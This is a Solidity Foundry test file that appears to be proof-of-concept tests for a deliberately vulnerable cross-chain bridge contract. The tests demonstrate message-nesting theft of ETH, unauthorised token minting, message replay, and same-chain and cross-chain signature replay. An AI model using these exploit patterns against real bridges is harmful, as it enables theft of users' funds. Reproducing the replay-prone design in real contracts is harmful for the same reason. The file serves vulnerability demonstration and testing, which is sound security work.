// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/BridgeSignatureReplay.sol";
import "../src/IBridge.sol";
import "../src/SignalProcessor.sol";

contract BridgeSignatureReplayTest is Test {
    BridgeSignatureReplay bridge;
    BridgeSignatureReplay destBridge;
    SignalProcessor signalProcessor;
    address owner = address(0x1);
    address user = address(0x1ABC);
    uint256 staticFee = 0.0001 ether;

    function setUp() public {
        signalProcessor = new SignalProcessor();
        bridge = new BridgeSignatureReplay(owner, address(signalProcessor));
        destBridge = new BridgeSignatureReplay(owner, address(signalProcessor));
    }

    function test_sendMsg_nested() public {
        IBridge.Transaction memory maliciousTransaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: user,
            to: user,
            value: 1 ether,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: bytes(""),
            repayAddr: address(0)
        });

        bytes32 messageHash = keccak256(abi.encode(maliciousTransaction));
        bytes memory data = abi.encodeWithSignature("sendTx(bytes32)", messageHash);
        IBridge.Transaction memory transaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: user, // the contract will replace this to msg.sender
            to: address(signalProcessor),
            value: 0,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: data,
            repayAddr: address(0)
        });

        vm.deal(user, 1 ether);
        vm.prank(user);
        bridge.sendMsg{value: staticFee}(transaction);

        // Mimic user's stored ETH on the bridge contract
        vm.deal(address(destBridge), 2 ether);

        // Executing the first transaction which will call the signal processor to store the malicious transaction hash.
        destBridge.executeMessage(transaction);

        // Attacker executes the malicious transaction which was stored in the signal processor with the help of first innocent looking transaction.
        destBridge.executeMessage(maliciousTransaction);

        assertEq(address(bridge).balance, staticFee, "fee is left");
        assertEq(address(destBridge).balance, 1 ether, "1 ETH stolen by the attacker");
    }

    function test_sendMsg_nested_transfer() public {
        (address alice, uint256 alicePk) = makeAddrAndKey("alice");
        IBridge.Transaction memory maliciousTransaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: alice,
            to: address(0),
            value: 0,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: abi.encodeWithSignature("mint(address,uint256)", alice, 9999 ether),
            repayAddr: address(0)
        });

        bytes32 messageHash = keccak256(abi.encode(maliciousTransaction));
        bytes memory data = abi.encodeWithSignature("sendTx(bytes32)", messageHash);
        IBridge.Transaction memory transaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: alice, // the contract will replace this to msg.sender
            to: address(signalProcessor),
            value: 0,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: data,
            repayAddr: address(0)
        });

        vm.deal(alice, 1 ether);
        vm.prank(alice);
        bridge.sendMsg{value: staticFee}(transaction);

        // Executing the first transaction which will call the signal processor to store the malicious transaction hash.
        destBridge.executeMessage(transaction);

        // Attacker executes the malicious transaction which was stored in the signal processor with the help of first innocent looking transaction.
        destBridge.executeMessage(maliciousTransaction);

        assertEq(address(bridge).balance, staticFee, "fee is left");
        assertEq(destBridge.balanceOf(alice), 9999 ether, "9999 tokens maliciously minted by the attacker");
    }

    function test_executeMessage_replay() public {
        (address alice, uint256 alicePk) = makeAddrAndKey("alice");
        vm.prank(owner);
        bridge.mint(alice, 1 ether);
        IBridge.Transaction memory transaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: alice,
            to: address(0),
            value: 0,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: abi.encodeWithSignature("mint(address,uint256)", alice, 1 ether),
            repayAddr: address(0)
        });

        vm.deal(alice, 2 ether);
        vm.prank(alice);
        bridge.sendMsg{value: staticFee}(transaction);

        bytes32 messageHash = keccak256(abi.encode(transaction));

        destBridge.executeMessage(transaction);

        // Processing the message again.
        destBridge.executeMessage(transaction);

        assertEq(bridge.balanceOf(alice), 0, "Sender should have 0 tokens left");
        assertEq(destBridge.balanceOf(alice), 2 ether, "receiver should have 1 token(s)");
    }

    function test_sendMsgPermit_signature_replay() public {
        (address alice, uint256 alicePk) = makeAddrAndKey("alice");

        vm.prank(owner);
        destBridge.mint(alice, 100 ether);

        IBridge.Transaction memory transaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: alice,
            to: address(0),
            value: 0,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: abi.encodeWithSignature("transfer(address,uint256)", user, 50 ether),
            repayAddr: address(0)
        });

        bytes32 messageHash = keccak256(abi.encode(transaction));
        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        // console.log("ethSignedMessageHash: "); console.logBytes32(ethSignedMessageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, ethSignedMessageHash);

        // Executor/Relayer executes.
        vm.deal(user, 2 ether);
        vm.prank(user);
        bridge.sendMsgPermit{value: staticFee}(transaction, v, r, s);

        assertEq(destBridge.balanceOf(user), 0, "User should have 0 tokens");
        assertEq(destBridge.balanceOf(alice), 100 ether, "Alice should have 100e18 tokens left");

        destBridge.executeMessage(transaction);

        assertEq(destBridge.balanceOf(user), 50 ether, "User should have 50e18 tokens");
        assertEq(destBridge.balanceOf(alice), 50 ether, "Alice should have 50e18 tokens left");

        // Signature replay.
        vm.prank(user);
        destBridge.sendMsgPermit{value: staticFee}(transaction, v, r, s);
        destBridge.executeMessage(transaction);

        assertEq(destBridge.balanceOf(user), 100 ether, "User should have 100e18 tokens");
        assertEq(destBridge.balanceOf(alice), 0, "Alice should have 0 tokens left");
    }

    function test_sendMsgPermit_cross_chain_signature_replay() public {
        (address alice, uint256 alicePk) = makeAddrAndKey("alice");

        IBridge.Transaction memory transaction = IBridge.Transaction({
            id: bridge.messageId(),
            from: alice,
            to: address(0),
            value: 0,
            srcChainId: block.chainid,
            dstChainId: 2,
            data: abi.encodeWithSignature("transfer(address,uint256)", user, 50 ether),
            repayAddr: address(0)
        });

        bytes32 messageHash = keccak256(abi.encode(transaction));
        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        // console.log("ethSignedMessageHash: "); console.logBytes32(ethSignedMessageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, ethSignedMessageHash);

        // Executor/Relayer executes.
        vm.deal(user, 2 ether);
        vm.prank(user);
        bridge.sendMsgPermit{value: staticFee}(transaction, v, r, s);

        uint256 prevChainId = block.chainid; //console.log("block.chainid", prevChainId);
        vm.chainId(2);
        assertNotEq(prevChainId, block.chainid);
        BridgeSignatureReplay destBridgeOnChainId2 = new BridgeSignatureReplay(owner, address(signalProcessor));

        vm.prank(owner);
        destBridgeOnChainId2.mint(alice, 100 ether);

        assertEq(destBridgeOnChainId2.balanceOf(user), 0, "User should have 0e18 tokens");
        assertEq(destBridgeOnChainId2.balanceOf(alice), 100 ether, "Alice should have 100e18 tokens left");

        destBridgeOnChainId2.executeMessage(transaction);

        assertEq(destBridgeOnChainId2.balanceOf(user), 50 ether, "User should have 50e18 tokens");
        assertEq(destBridgeOnChainId2.balanceOf(alice), 50 ether, "Alice should have 50e18 tokens left");

        // Signature replay on the chain id 2.
        vm.prank(user);
        bridge.sendMsgPermit{value: staticFee}(transaction, v, r, s);
        destBridgeOnChainId2.executeMessage(transaction);

        assertEq(destBridgeOnChainId2.balanceOf(user), 100 ether, "User should have 100e18 tokens");
        assertEq(destBridgeOnChainId2.balanceOf(alice), 0, "Alice should have 0e18 tokens left");
    }
}
